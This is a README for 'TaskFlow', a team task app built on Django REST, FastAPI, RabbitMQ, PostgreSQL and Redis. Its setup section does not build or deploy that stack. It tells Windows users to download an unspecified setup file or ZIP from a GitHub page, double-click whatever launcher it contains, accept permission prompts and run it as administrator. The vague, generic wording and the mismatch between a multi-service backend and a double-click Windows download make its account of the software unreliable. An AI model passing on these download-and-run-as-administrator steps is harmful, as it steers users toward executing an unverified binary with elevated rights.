# 🗂️ TaskFlow - Simple task tracking for teams

[![Download TaskFlow](https://img.shields.io/badge/Download-TaskFlow-4C78FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MrRedstoneY/TaskFlow)

## 🚀 Getting Started

TaskFlow is a team task app that helps you manage work in one place. It supports shared tasks, live updates, login with tokens, and background notifications.

This page shows you how to get TaskFlow on Windows and start it with a few clicks.

## 💾 Download TaskFlow

1. Open the TaskFlow page: https://github.com/MrRedstoneY/TaskFlow
2. Look for the download area or release files on the page
3. Download the Windows version if one is listed
4. Save the file to your Desktop or Downloads folder
5. If you get a ZIP file, extract it first

If the page shows a setup file, download and run that file.

[Visit the TaskFlow download page](https://github.com/MrRedstoneY/TaskFlow)

## 🪟 Windows Setup

Before you start, make sure your PC meets these basic needs:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 500 MB of free disk space
- Internet access for login and sync
- A modern browser if the app opens in a web page

If TaskFlow comes as a folder with files, keep all files together in the same place.

## 📦 Install and Run

1. Download the TaskFlow file from the link above
2. If the file is zipped, right-click it and choose Extract All
3. Open the extracted folder
4. Find the main app file or launcher
5. Double-click it to start TaskFlow
6. If Windows asks for permission, choose Yes
7. Wait for the app to load in your browser or app window

If you see a local address such as `http://localhost`, copy it into your browser if needed.

## 🔐 Sign In

TaskFlow uses secure sign-in with tokens.

1. Open the app
2. Enter your account details if asked
3. Sign in with your user name and password
4. Keep your session open while you work
5. Sign out when you finish on a shared PC

## 🧩 What TaskFlow Can Do

- Create and track tasks
- Share tasks with other people
- See updates as they happen
- Get task events through live connections
- Receive notifications for changes
- Keep data in PostgreSQL
- Store fast cache data in Redis
- Handle background events with RabbitMQ
- Use a clean API for task data
- Work with real-time messages through WebSockets

## 📁 How the App Works

TaskFlow uses a few parts behind the scenes:

- Django REST handles the main task API
- JWT keeps sign-in secure
- WebSockets help with live updates
- RabbitMQ moves events between services
- FastAPI sends notifications
- PostgreSQL stores task data
- Redis helps the app stay fast
- Nginx helps serve the app

You do not need to set these up by hand if you are only running the app from a ready-made download

## 🛠️ If the App Does Not Start

Try these steps:

1. Restart your PC
2. Make sure the file finished downloading
3. Extract the ZIP file again if needed
4. Run the app as an administrator
5. Check that your internet connection works
6. Close other apps that use a lot of memory
7. Try a different browser if the app opens in one

If the app still does not open, download the file again from the same page

## 🔄 Using TaskFlow Every Day

- Open the app from the same file or shortcut
- Sign in with your account
- Add new tasks
- Assign work to teammates
- Watch task changes update live
- Check notifications for new activity
- Refresh the page if updates pause

## 🧪 Common Questions

### Does TaskFlow need coding knowledge?

No. The app is meant to be used by regular computer users

### Can I use it on Windows?

Yes. This guide is made for Windows users

### Do I need to install all the services myself?

No, not for normal use from a ready download

### Why does TaskFlow use so many tools?

Each tool handles one job, such as login, live updates, storage, or messages

## 🗂️ Files You May See

If you open the download, you may see files like:

- a launcher file
- a config file
- a folder for static files
- a data folder
- a README file
- a log file

Keep the folder structure unchanged unless the instructions on the download page say to move files

## 🔎 Project Topics

django, djangorestframework, docker-compose, fastapi, jwt, nginx, postgresql, python, rabbitmq, redis, websockets